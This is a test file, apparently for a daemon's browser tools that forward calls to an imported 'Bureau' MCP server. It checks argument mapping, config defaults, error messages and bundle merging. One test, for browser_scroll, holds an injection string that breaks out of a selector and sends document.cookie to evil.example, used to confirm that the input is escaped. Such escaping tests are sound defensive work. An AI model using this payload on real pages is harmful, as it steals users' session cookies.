/**
 * Tests for the daemon `browser_*` tools, which all forward to Bureau, and
 * the built-in `browser` capability bundle.
 *
 * Fakes only: an in-memory MCP client/transport for the tool surface and a
 * structural `mcpProxy.callTool` double standing in for the imported Bureau
 * MCP. No browser, no network, no config file read.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest"
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js"
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js"
import { Client } from "@modelcontextprotocol/sdk/client/index.js"

import { registerBrowserTools } from "../browser-tools.js"
import {
  LEGACY_BUILTIN_ON_WARNING,
  buildScrollExpression,
  isProxiedBrowserTool,
  resolveBrowserBuiltin,
  resolveBrowserProxyImport,
} from "../browser-proxy.js"
import { builtinBrowserBundle, effectiveBundles, type Bundle } from "../bundles.js"
import type { ImportedMcpsConfig } from "../mcp-imports.js"
import type { ProxyCallContext, ProxyCallOutcome } from "../mcp-proxy.js"

const CALLER = "sess-caller"
const SESSION_NOTE = 'ignored "sessionId": Bureau identifies the caller session itself'

const OK_RESULT = {
  content: [{ type: "text" as const, text: '{"ok":true}' }],
  structuredContent: { ok: true },
}

type CallToolFn = (
  alias: string,
  toolName: string,
  args: unknown,
  context?: ProxyCallContext,
) => Promise<ProxyCallOutcome>

function fakeProxy(result: unknown = OK_RESULT) {
  return {
    callTool: vi.fn<CallToolFn>(async () => ({ ok: true as const, result })),
  }
}

/** A fake imported Bureau MCP that answers per Bureau tool name. */
function fakeBureau(byTool: Record<string, unknown>) {
  return {
    callTool: vi.fn<CallToolFn>(async (_alias, toolName) =>
      toolName in byTool
        ? { ok: true as const, result: byTool[toolName] }
        : { ok: false as const, error: `unexpected Bureau tool ${toolName}` },
    ),
  }
}

async function makeSetup(opts: {
  proxyImport?: string
  builtin?: "off" | "proxy"
  proxy?: { callTool: ReturnType<typeof vi.fn<CallToolFn>> } | null
}) {
  const server = new McpServer({ name: "test-browser-proxy", version: "0.0.1" })
  const proxy = opts.proxy === undefined ? fakeProxy() : opts.proxy

  // No `builtin` unless a test asks: the default must be the Bureau relay.
  registerBrowserTools(server, {
    ...(proxy ? { mcpProxy: proxy } : {}),
    callerSessionId: CALLER,
    loadProxyImport: async () => opts.proxyImport ?? "bureau",
    ...(opts.builtin ? { builtin: opts.builtin } : {}),
  })

  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair()
  await server.connect(serverTransport)
  const client = new Client({ name: "test-client", version: "0.0.1" })
  await client.connect(clientTransport)

  return {
    client,
    proxy,
    cleanup: async () => {
      await client.close()
    },
  }
}

function textOf(result: unknown): string | undefined {
  const content = (result as { content: Array<{ type: string; text?: string }> }).content
  return content.find(c => c.type === "text")?.text
}

const REMOVED_TOOLS = [
  "browser_select",
  "browser_wait_for",
  "browser_upload_file",
  "browser_new_tab",
  "start_browser",
  "stop_browser",
  "browser_status",
  "browser_adapter_list",
]

const RELAYED_TOOLS = [
  "fetch_page",
  "list_browsers",
  "browser_navigate",
  "browser_screenshot",
  "browser_extract_text",
  "browser_get_dom",
  "browser_click",
  "browser_fill",
  "browser_evaluate",
  "browser_scroll",
  "browser_press_key",
  "browser_list_tabs",
  "browser_screencast_start",
  "browser_screencast_frame",
  "browser_screencast_stop",
]

describe("tools/list", () => {
  it("registers the relayed tools and none of the removed ones by default", async () => {
    const { client, cleanup } = await makeSetup({})
    try {
      const names = (await client.listTools()).tools.map(t => t.name).sort()
      expect(names).toEqual([...RELAYED_TOOLS].sort())
      for (const name of REMOVED_TOOLS) expect(names).not.toContain(name)
    } finally {
      await cleanup()
    }
  })

  it("off registers only fetch_page", async () => {
    const { client, proxy, cleanup } = await makeSetup({ builtin: "off" })
    try {
      const names = (await client.listTools()).tools.map(t => t.name)
      expect(names).toEqual(["fetch_page"])
      const res = await client.callTool({
        name: "browser_navigate",
        arguments: { url: "https://example.com" },
      })
      expect(res.isError).toBe(true)
      expect(textOf(res)).toContain("browser_navigate")
      expect(proxy?.callTool).not.toHaveBeenCalled()
    } finally {
      await cleanup()
    }
  })
})

describe("config", () => {
  it("defaults builtin to proxy and reads a legacy on as proxy with a warning", () => {
    const warn = vi.fn()
    expect(resolveBrowserBuiltin(undefined, warn)).toBe("proxy")
    expect(resolveBrowserBuiltin({}, warn)).toBe("proxy")
    expect(resolveBrowserBuiltin({ builtin: "proxy" }, warn)).toBe("proxy")
    expect(resolveBrowserBuiltin({ builtin: "off" }, warn)).toBe("off")
    expect(warn).not.toHaveBeenCalled()

    expect(resolveBrowserBuiltin({ builtin: "on" }, warn)).toBe("proxy")
    expect(warn).toHaveBeenCalledTimes(1)
    expect(warn).toHaveBeenCalledWith(LEGACY_BUILTIN_ON_WARNING)
    expect(LEGACY_BUILTIN_ON_WARNING).toContain('"on"')
    expect(LEGACY_BUILTIN_ON_WARNING).toContain('"proxy"')
  })

  it("the default warning goes to the daemon log once per process", () => {
    const spy = vi.spyOn(console, "warn").mockImplementation(() => {})
    try {
      resolveBrowserBuiltin({ builtin: "on" })
      resolveBrowserBuiltin({ builtin: "on" })
      expect(spy).toHaveBeenCalledTimes(1)
      expect(String(spy.mock.calls[0]?.[0])).toContain(LEGACY_BUILTIN_ON_WARNING)
    } finally {
      spy.mockRestore()
    }
  })

  it("defaults proxyImport to bureau", () => {
    expect(resolveBrowserProxyImport(undefined)).toBe("bureau")
    expect(resolveBrowserProxyImport({})).toBe("bureau")
    expect(resolveBrowserProxyImport({ proxyImport: "bureau-2" })).toBe("bureau-2")
  })
})

describe("relayed tools forward to Bureau with the caller identity", () => {
  const cases: Array<{
    tool: string
    input: Record<string, unknown>
    target: string
    expectedArgs: Record<string, unknown>
    expectedNotes: string[]
  }> = [
    {
      tool: "browser_navigate",
      input: { sessionId: "s", url: "https://example.com", tabId: "t1", instance: "inst-1" },
      target: "browser_navigate",
      expectedArgs: { url: "https://example.com", tabId: "t1", instance: "inst-1" },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_click",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1", selector: "#go", button: "left", clickCount: 2 },
      target: "browser_click",
      expectedArgs: { selector: "#go", button: "left", clickCount: 2, tabId: "t1", instance: "inst-1" },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_fill",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1", selector: "#q", value: "hello", clear: false },
      target: "browser_fill",
      expectedArgs: { selector: "#q", value: "hello", clear: false, tabId: "t1", instance: "inst-1" },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_evaluate",
      input: {
        sessionId: "s",
        tabId: "t1",
        instance: "inst-1",
        expression: "document.title",
        awaitPromise: false,
        returnByValue: true,
        maxResultBytes: 1024,
      },
      target: "browser_evaluate",
      expectedArgs: {
        expression: "document.title",
        awaitPromise: false,
        returnByValue: true,
        maxResultBytes: 1024,
        tabId: "t1",
        instance: "inst-1",
      },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_get_dom",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1" },
      target: "browser_get_dom",
      expectedArgs: { tabId: "t1", instance: "inst-1" },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_screenshot",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1" },
      target: "browser_screenshot",
      expectedArgs: { tabId: "t1", instance: "inst-1" },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_press_key",
      input: {
        sessionId: "s",
        tabId: "t1",
        instance: "inst-1",
        key: "ArrowDown",
        selector: "#list",
        count: 2,
        modifiers: ["Shift"],
      },
      target: "browser_press_key",
      expectedArgs: {
        key: "ArrowDown",
        selector: "#list",
        count: 2,
        modifiers: ["Shift"],
        tabId: "t1",
        instance: "inst-1",
      },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "browser_list_tabs",
      input: { sessionId: "s", instance: "inst-1" },
      target: "browser_list_owned_tabs",
      expectedArgs: { instance: "inst-1" },
      expectedNotes: ['ignored "sessionId": Bureau identifies the caller session itself'],
    },
    {
      tool: "list_browsers",
      input: { onlyAlive: true, instance: "inst-1" },
      target: "browser_list_instances",
      expectedArgs: { instance: "inst-1" },
      expectedNotes: [
        "Bureau browser_list_instances returns instances, not the daemon's browser-session descriptors",
        'dropped "onlyAlive" (no Bureau equivalent)',
      ],
    },
  ]

  for (const c of cases) {
    it(`${c.tool} -> Bureau ${c.target}`, async () => {
      const { client, proxy, cleanup } = await makeSetup({})
      try {
        const res = await client.callTool({ name: c.tool, arguments: c.input })
        expect(res.isError).toBeFalsy()
        expect(proxy?.callTool).toHaveBeenCalledTimes(1)
        expect(proxy?.callTool).toHaveBeenCalledWith("bureau", c.target, c.expectedArgs, {
          callerSessionId: CALLER,
        })
        expect((res.structuredContent as { deprecated?: string }).deprecated).toContain("proxy to Bureau")
        expect((res.structuredContent as { notes?: string[] }).notes ?? []).toEqual(c.expectedNotes)
      } finally {
        await cleanup()
      }
    })
  }

  const screencastCases: Array<{
    tool: string
    input: Record<string, unknown>
    target: string
    expectedArgs: Record<string, unknown>
    expectedNotes: string[]
  }> = [
    {
      tool: "browser_screencast_start",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1", fps: 5, format: "png" },
      target: "browser_record_start",
      expectedArgs: { tabId: "t1", instance: "inst-1", fps: 5, format: "png" },
      expectedNotes: [SESSION_NOTE],
    },
    {
      tool: "browser_screencast_start",
      input: { sessionId: "s", tabId: "t1", quality: 50, everyNthFrame: 2, maxWidth: 800, maxHeight: 600 },
      target: "browser_record_start",
      expectedArgs: { tabId: "t1" },
      expectedNotes: [
        'dropped "quality" (no Bureau equivalent)',
        'dropped "everyNthFrame" (no Bureau equivalent)',
        'dropped "maxWidth" (no Bureau equivalent)',
        'dropped "maxHeight" (no Bureau equivalent)',
        SESSION_NOTE,
      ],
    },
    {
      tool: "browser_screencast_frame",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1" },
      target: "browser_record_frame",
      expectedArgs: { tabId: "t1", instance: "inst-1" },
      expectedNotes: [SESSION_NOTE],
    },
    {
      tool: "browser_screencast_stop",
      input: { sessionId: "s", tabId: "t1", instance: "inst-1", encode: false },
      target: "browser_record_stop",
      expectedArgs: { tabId: "t1", instance: "inst-1", encode: false },
      expectedNotes: [SESSION_NOTE],
    },
  ]

  for (const c of screencastCases) {
    it(`${c.tool} -> Bureau ${c.target} with ${JSON.stringify(c.expectedArgs)}`, async () => {
      const { client, proxy, cleanup } = await makeSetup({})
      try {
        const res = await client.callTool({ name: c.tool, arguments: c.input })
        expect(res.isError).toBeFalsy()
        expect(proxy?.callTool).toHaveBeenCalledTimes(1)
        expect(proxy?.callTool).toHaveBeenCalledWith("bureau", c.target, c.expectedArgs, {
          callerSessionId: CALLER,
        })
        expect((res.structuredContent as { notes?: string[] }).notes ?? []).toEqual(c.expectedNotes)
      } finally {
        await cleanup()
      }
    })
  }

  it("works without the retired sessionId and forwards to a configured alias", async () => {
    const { client, proxy, cleanup } = await makeSetup({ proxyImport: "my-bureau" })
    try {
      const res = await client.callTool({ name: "browser_navigate", arguments: { url: "https://example.com" } })
      expect(res.isError).toBeFalsy()
      expect(proxy?.callTool).toHaveBeenCalledWith("my-bureau", "browser_navigate", { url: "https://example.com" }, {
        callerSessionId: CALLER,
      })
      expect((res.structuredContent as { notes?: string[] }).notes).toBeUndefined()
    } finally {
      await cleanup()
    }
  })

  it("every relayed tool works without sessionId and reaches Bureau with the caller identity", async () => {
    const minimal: Record<string, Record<string, unknown>> = {
      list_browsers: {},
      browser_navigate: { url: "https://example.com" },
      browser_screenshot: {},
      browser_extract_text: {},
      browser_get_dom: {},
      browser_click: { selector: "#go" },
      browser_fill: { selector: "#q", value: "x" },
      browser_evaluate: { expression: "1" },
      browser_scroll: { y: 10 },
      browser_press_key: { key: "Enter" },
      browser_list_tabs: {},
      browser_screencast_start: { tabId: "t1" },
      browser_screencast_frame: { tabId: "t1" },
      browser_screencast_stop: { tabId: "t1" },
    }
    const proxy = {
      callTool: vi.fn<CallToolFn>(async (_alias, toolName) =>
        toolName === "browser_get_dom"
          ? { ok: true as const, result: { structuredContent: { html: "<html><title>T</title><body><p>hi</p></body></html>" } } }
          : { ok: true as const, result: OK_RESULT },
      ),
    }
    const { client, cleanup } = await makeSetup({ proxy })
    try {
      const tools = (await client.listTools()).tools.filter(t => t.name !== "fetch_page")
      expect(tools.map(t => t.name).sort()).toEqual(Object.keys(minimal).sort())
      for (const tool of tools) {
        expect((tool.inputSchema as { required?: string[] }).required ?? []).not.toContain("sessionId")
        proxy.callTool.mockClear()
        const res = await client.callTool({ name: tool.name, arguments: minimal[tool.name]! })
        expect(res.isError, `${tool.name}: ${textOf(res)}`).toBeFalsy()
        expect(proxy.callTool.mock.calls.length, tool.name).toBeGreaterThan(0)
        for (const call of proxy.callTool.mock.calls) {
          expect(call[0]).toBe("bureau")
          expect(call[2]).not.toHaveProperty("sessionId")
          expect(call[3]).toEqual({ callerSessionId: CALLER })
        }
      }
    } finally {
      await cleanup()
    }
  })

  it("every relayed tool except the two adapted relays is in the proxy mapping", () => {
    for (const tool of RELAYED_TOOLS) {
      if (tool === "fetch_page" || tool === "browser_extract_text" || tool === "browser_scroll") continue
      expect(isProxiedBrowserTool(tool)).toBe(true)
    }
    for (const tool of REMOVED_TOOLS) expect(isProxiedBrowserTool(tool)).toBe(false)
  })
})

describe("browser_extract_text", () => {
  const HTML =
    "<html><head><title>Hello page</title></head><body><nav>menu menu menu</nav>" +
    "<article><h1>Hello page</h1><p>The quick brown fox jumps over the lazy dog, and then " +
    "it does that again, many times, so the article has enough words to be extracted as " +
    "the main content of this page.</p></article></body></html>"

  it("reads Bureau's DOM and returns { title, text, url } extracted on the daemon", async () => {
    const proxy = fakeBureau({
      browser_get_dom: { content: [{ type: "text", text: JSON.stringify({ html: HTML }) }] },
      browser_evaluate: { structuredContent: { value: "https://example.com/hello", truncated: false } },
    })
    const { client, cleanup } = await makeSetup({ proxy })
    try {
      const res = await client.callTool({
        name: "browser_extract_text",
        arguments: { sessionId: "s", tabId: "t1", instance: "inst-1" },
      })
      expect(res.isError).toBeFalsy()
      const sc = res.structuredContent as { title: string; text: string; url: string; notes?: string[] }
      expect(sc.title).toBe("Hello page")
      expect(sc.text).toContain("quick brown fox")
      expect(sc.text).not.toContain("<p>")
      expect(sc.url).toBe("https://example.com/hello")
      expect(sc.notes).toEqual([SESSION_NOTE])

      expect(proxy.callTool).toHaveBeenNthCalledWith(1, "bureau", "browser_get_dom", { tabId: "t1", instance: "inst-1" }, {
        callerSessionId: CALLER,
      })
      expect(proxy.callTool).toHaveBeenNthCalledWith(
        2,
        "bureau",
        "browser_evaluate",
        { tabId: "t1", instance: "inst-1", expression: "location.href", returnByValue: true },
        { callerSessionId: CALLER },
      )
    } finally {
      await cleanup()
    }
  })

  it("still extracts when the url read fails", async () => {
    const proxy = fakeBureau({ browser_get_dom: { structuredContent: { html: HTML } } })
    const { client, cleanup } = await makeSetup({ proxy })
    try {
      const res = await client.callTool({ name: "browser_extract_text", arguments: {} })
      expect(res.isError).toBeFalsy()
      expect((res.structuredContent as { text: string }).text).toContain("quick brown fox")
      expect((res.structuredContent as { url: string }).url).toBe("")
    } finally {
      await cleanup()
    }
  })

  it("returns a Bureau get_dom error unchanged", async () => {
    const bureauError = { content: [{ type: "text", text: "browser:not_owner" }], isError: true }
    const proxy = fakeBureau({ browser_get_dom: bureauError })
    const { client, cleanup } = await makeSetup({ proxy })
    try {
      const res = await client.callTool({ name: "browser_extract_text", arguments: { tabId: "t9" } })
      expect(res.isError).toBe(true)
      expect(res.content).toEqual(bureauError.content)
      expect(proxy.callTool).toHaveBeenCalledTimes(1)
    } finally {
      await cleanup()
    }
  })
})

describe("browser_scroll", () => {
  const MALICIOUS = '"); fetch("https://evil.example/?c=" + document.cookie); ("'

  it("sends Bureau browser_evaluate only the fixed script, the selector escaped as data", async () => {
    const { client, proxy, cleanup } = await makeSetup({})
    try {
      const res = await client.callTool({
        name: "browser_scroll",
        arguments: { sessionId: "s", tabId: "t1", selector: MALICIOUS, expression: "alert(1)" },
      })
      expect(res.isError).toBeFalsy()
      expect(proxy?.callTool).toHaveBeenCalledTimes(1)
      const [alias, tool, args, context] = proxy!.callTool.mock.calls[0]!
      expect(alias).toBe("bureau")
      expect(tool).toBe("browser_evaluate")
      expect(context).toEqual({ callerSessionId: CALLER })
      const forwarded = args as Record<string, unknown>
      expect(Object.keys(forwarded).sort()).toEqual(["awaitPromise", "expression", "returnByValue", "tabId"])
      expect(forwarded.tabId).toBe("t1")
      expect(forwarded.expression).toBe(buildScrollExpression({ selector: MALICIOUS }))

      const expression = forwarded.expression as string
      // The selector appears once, inside the JSON data literal, quotes escaped.
      expect(expression).toContain(`const a = ${JSON.stringify({ selector: MALICIOUS })};`)
      expect(expression).not.toContain(MALICIOUS)
      expect(expression).not.toContain("alert(1)")
      // Removing the data literal leaves the fixed template, with no caller text.
      const template = expression.replace(JSON.stringify({ selector: MALICIOUS }), "DATA")
      expect(template).toBe(buildScrollExpression({ selector: "x" }).replace(JSON.stringify({ selector: "x" }), "DATA"))
      expect(template).not.toContain("evil.example")
    } finally {
      await cleanup()
    }
  })

  it("the fixed script scrolls the element into view, and only reads the selector as data", () => {
    const calls: unknown[] = []
    const element = { scrollIntoView: (o: unknown) => calls.push(["scrollIntoView", o]) }
    const document = {
      querySelector: (sel: unknown) => {
        calls.push(["querySelector", sel])
        return element
      },
    }
    const window = { scrollBy: () => calls.push(["scrollBy"]), scrollX: 0, scrollY: 120 }
    const run = new Function("document", "window", `return ${buildScrollExpression({ selector: MALICIOUS })}`)
    expect(run(document, window)).toEqual({ scrollX: 0, scrollY: 120 })
    expect(calls).toEqual([
      ["querySelector", MALICIOUS],
      ["scrollIntoView", { block: "center", inline: "center" }],
    ])
  })

  it("x/y scroll the window by the given deltas", async () => {
    const { client, proxy, cleanup } = await makeSetup({})
    try {
      await client.callTool({ name: "browser_scroll", arguments: { y: 600 } })
      const args = proxy!.callTool.mock.calls[0]![2] as { expression: string }
      expect(args.expression).toBe(buildScrollExpression({ y: 600 }))
      expect(args.expression).toContain('const a = {"x":0,"y":600};')
      const scrolled: unknown[] = []
      const window = { scrollBy: (x: number, y: number) => scrolled.push([x, y]), scrollX: 0, scrollY: 600 }
      new Function("document", "window", `return ${args.expression}`)({}, window)
      expect(scrolled).toEqual([[0, 600]])
    } finally {
      await cleanup()
    }
  })
})

describe("a missing Bureau import gives a clear error", () => {
  it("names Bureau and the alias when the import is absent", async () => {
    const proxy = {
      callTool: vi.fn<CallToolFn>(async () => ({ ok: false as const, error: 'unknown alias "bureau"' })),
    }
    const { client, cleanup } = await makeSetup({ proxy })
    try {
      for (const name of ["browser_navigate", "browser_extract_text", "browser_scroll"]) {
        const res = await client.callTool({ name, arguments: { url: "https://example.com", selector: "#a" } })
        expect(res.isError).toBe(true)
        const text = textOf(res) ?? ""
        expect(text).toContain(name)
        expect(text).toContain("Bureau is not imported")
        expect(text).toContain('"bureau"')
        expect(text).toContain("defaults.browser.proxyImport")
      }
    } finally {
      await cleanup()
    }
  })

  it("names Bureau when the import is not connected", async () => {
    const proxy = {
      callTool: vi.fn<CallToolFn>(async () => ({ ok: false as const, error: "connect ECONNREFUSED 127.0.0.1:8830" })),
    }
    const { client, cleanup } = await makeSetup({ proxy })
    try {
      const res = await client.callTool({ name: "browser_list_tabs", arguments: {} })
      expect(res.isError).toBe(true)
      expect(textOf(res)).toBe(
        'browser_list_tabs: Bureau (imported MCP "bureau") is unavailable: connect ECONNREFUSED 127.0.0.1:8830',
      )
    } finally {
      await cleanup()
    }
  })

  it("names Bureau when no imported-MCP registry is wired", async () => {
    const { client, cleanup } = await makeSetup({ proxy: null })
    try {
      const res = await client.callTool({ name: "browser_screenshot", arguments: {} })
      expect(res.isError).toBe(true)
      expect(textOf(res)).toContain("browser_screenshot: Bureau is not reachable")
    } finally {
      await cleanup()
    }
  })
})

describe("browser proxy - error passthrough", () => {
  it("returns a Bureau tool error unchanged (no deprecated marker added)", async () => {
    const bureauError = {
      content: [{ type: "text" as const, text: "browser:not_owner" }],
      isError: true,
    }
    const { client, cleanup } = await makeSetup({
      proxyImport: "bureau",
      proxy: fakeProxy(bureauError),
    })
    try {
      const res = await client.callTool({
        name: "browser_navigate",
        arguments: { sessionId: "s", url: "https://example.com" },
      })
      expect(res.isError).toBe(true)
      expect(res.structuredContent).toBeUndefined()
      expect(res.content).toEqual([{ type: "text", text: "browser:not_owner" }])
    } finally {
      await cleanup()
    }
  })
})

describe("built-in browser bundle", () => {
  const imported: ImportedMcpsConfig = {
    version: 1,
    imports: [
      {
        id: "import-bureau",
        alias: "bureau",
        addedAt: "2026-01-01T00:00:00.000Z",
        snapshot: { id: "bureau", source: "claude-code", scope: "user", name: "bureau", type: "http" } as never,
      },
      {
        id: "import-other",
        alias: "other",
        addedAt: "2026-01-01T00:00:00.000Z",
        snapshot: { id: "other", source: "claude-code", scope: "user", name: "other", type: "http" } as never,
      },
    ],
  }

  it("resolves to the import whose alias is proxyImport, plus skill browser", () => {
    expect(builtinBrowserBundle("bureau", imported)).toEqual({
      id: "browser",
      label: "Browser (Bureau)",
      mcpImports: ["import-bureau"],
      skills: ["browser"],
    })
  })

  it("has no imports when proxyImport is unset", () => {
    expect(builtinBrowserBundle(undefined, imported)).toMatchObject({
      id: "browser",
      mcpImports: [],
      skills: ["browser"],
    })
  })

  it("is listed, and a user bundle with the same id wins", () => {
    const userBundle: Bundle = {
      id: "browser",
      label: "My browser",
      mcpImports: ["import-other"],
      skills: ["mine"],
    }
    const merged = effectiveBundles([userBundle], "bureau", imported)
    expect(merged.filter(b => b.id === "browser")).toEqual([userBundle])

    const onlyBuiltin = effectiveBundles([], "bureau", imported)
    expect(onlyBuiltin).toEqual([builtinBrowserBundle("bureau", imported)])
  })
})
